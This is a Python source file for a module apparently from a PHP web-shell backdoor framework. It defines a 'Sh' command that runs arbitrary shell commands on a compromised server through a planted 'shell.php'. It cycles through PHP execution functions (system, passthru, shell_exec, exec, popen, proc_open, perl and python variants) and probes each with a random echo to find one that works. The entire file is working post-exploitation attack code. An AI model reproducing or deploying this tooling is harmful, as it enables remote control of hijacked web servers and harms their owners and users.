'''
Created on 22/ago/2011

@author: norby
'''
from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed
from core.moduleprobeall import ModuleProbeAll
from core.vector import VectorList, Vector
from core.savedargparse import SavedArgumentParser as ArgumentParser
from argparse import SUPPRESS
import random

MSG_SH_INTERPRETER_SUCCEED = 'Shell interpreter load succeed'
WARN_SH_INTERPRETER_FAIL = 'Shell interpreters load failed'

class Sh(ModuleProbeAll):
    '''Shell to execute system commands'''

    vectors = VectorList([
            Vector('shell.php', "system", "system('$cmd$stderr');"),
            Vector('shell.php', "passthru" , "passthru('$cmd$stderr');"),
            Vector('shell.php', "shell_exec", "echo shell_exec('$cmd$stderr');"),
            Vector('shell.php', "exec", "exec('$cmd$stderr', $r); echo(join(\"\\n\",$r));"),
#            Vector('shell.php', "pcntl", ' $p = pcntl_fork(); if(!$p) {{ pcntl_exec( "/bin/sh", Array("-c", "$cmd")); }} else {{ pcntl_waitpid($p,$status); }}'),
            Vector('shell.php', "popen", "$h = popen('$cmd','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"),
            Vector('shell.php', "python_eval", "python_eval('import os; os.system('$cmd$stderr');"),
            Vector('shell.php', "perl_system", "$perl = new perl(); $r = @perl->system('$cmd$stderr'); echo $r;"),
            Vector('shell.php', "proc_open", """$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
$h = proc_open('$cmd', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));
while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);
fclose($pipes[2]); proc_close($h);"""),
            ])

    argparser = ArgumentParser(usage=__doc__)
    argparser.add_argument('cmd', help='Shell command', nargs='+' )
    argparser.add_argument('-stderr', help='Print standard error output', action='store_const', const=False, default=True)
    argparser.add_argument('-vector', choices = vectors.get_names())
    argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
    
    def _init_module(self):
        self.stored_args = { 'vector' : None }

    def _execute_vector(self):

        if not self.stored_args['vector'] or self.args['just_probe']:
            self.__slacky_probe()
            
        # Execute if is current vector is saved or choosen
        if self.current_vector.name in (self.stored_args['vector'], self.args['vector'])  :
            self._result = self.current_vector.execute(self.modhandler, self.args_formats)
        
        
    def _prepare_vector(self):
        
        # Format cmd
        self.args_formats['cmd'] = ' '.join(self.args['cmd']).replace( "'", "\\'" )
    
        # Format stderr
        if any('$stderr' in p for p in self.current_vector.payloads):
            if self.args['stderr']:
                self.args_formats['stderr'] = ''
            else:
                self.args_formats['stderr'] = ' 2>&1'
 


    def __slacky_probe(self):
        
        rand = str(random.randint( 11111, 99999 ))
        
        slacky_formats = self.args_formats.copy()
        slacky_formats['cmd'] = 'echo %s' % (rand)
        
        if self.current_vector.execute(self.modhandler, slacky_formats) == rand:
            
            self.stored_args['vector'] = self.current_vector.name
            
            # Set as best interpreter
            #self.modhandler.interpreter = self.name
            if self.args['just_probe']:
                
                self._result = True 
                raise ProbeSucceed(self.name, MSG_SH_INTERPRETER_SUCCEED)
            
            return
        
        raise ModuleException(self.name, WARN_SH_INTERPRETER_FAIL)
            
            
            








